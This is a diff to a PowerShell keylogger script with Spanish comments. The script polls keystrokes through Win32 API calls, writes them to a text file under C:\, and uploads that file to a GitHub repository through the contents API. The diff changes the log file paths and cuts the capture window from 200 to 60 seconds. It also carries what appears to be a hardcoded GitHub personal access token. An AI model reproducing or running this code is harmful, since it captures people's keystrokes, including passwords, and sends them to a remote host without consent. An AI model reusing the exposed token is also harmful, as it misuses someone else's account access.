@@ -2,9 +2,9 @@
 $token = "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"  # Reemplaza con tu token de acceso personal de GitHub
 $repoOwner = "SAHIBADAS"  # Reemplaza con tu nombre de usuario o la organización del repositorio
 $repoName = "Prueba_klg"  # Reemplaza con el nombre de tu repositorio
-$filePath = "C:\archivo\keylog.txt"
+$filePath = "C:\keylog.txt"
 $name = "keylog"
-$path = "C:\archivo\$name.txt"
+$path = "C:\$name.txt"
 $branch = "main"  # Cambia si usas otra rama
 $commitMessage = "Prueba desde otro dispositivo"
 $apiUrl = "https://api.github.com/repos/$repoOwner/$repoName/contents/$(Split-Path -Leaf $filePath)"
@@ -29,7 +29,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
 try {
-    while (((Get-Date) - $startTime).TotalSeconds -lt 200) {
+    while (((Get-Date) - $startTime).TotalSeconds -lt 60) {
         Start-Sleep -Milliseconds 40
         
         for ($ascii = 9; $ascii -le 254; $ascii++) {
